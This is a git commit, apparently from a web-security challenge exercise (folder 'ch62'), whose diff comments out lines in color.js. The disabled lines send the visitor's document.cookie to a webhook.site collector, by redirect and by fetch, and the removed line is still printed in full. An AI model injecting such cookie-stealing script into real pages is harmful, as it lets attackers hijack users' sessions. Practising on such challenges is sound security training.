125aa699e35c667a18ee39b2375ee5e5a0c9ab0d
LaT4upe <52156209+LaT4upe@users.noreply.github.com>
2025-12-03 15:46:51 +0100

    Comment out location and fetch lines in color.js

--- ch62/color.js
+++ ch62/color.js
@@ -1,4 +1,4 @@
-location="https://webhook.site/02809167-fd8b-4c01-b193-b846a066446f?cookie="+document.cookie;
+//location="https://webhook.site/02809167-fd8b-4c01-b193-b846a066446f?cookie="+document.cookie;
 //alert("bonjour");
 //console.log("color.js chargé");
 //fetch("https://webhook.site/02809167-fd8b-4c01-b193-b846a066446f?cookie="); // + document.cookie);
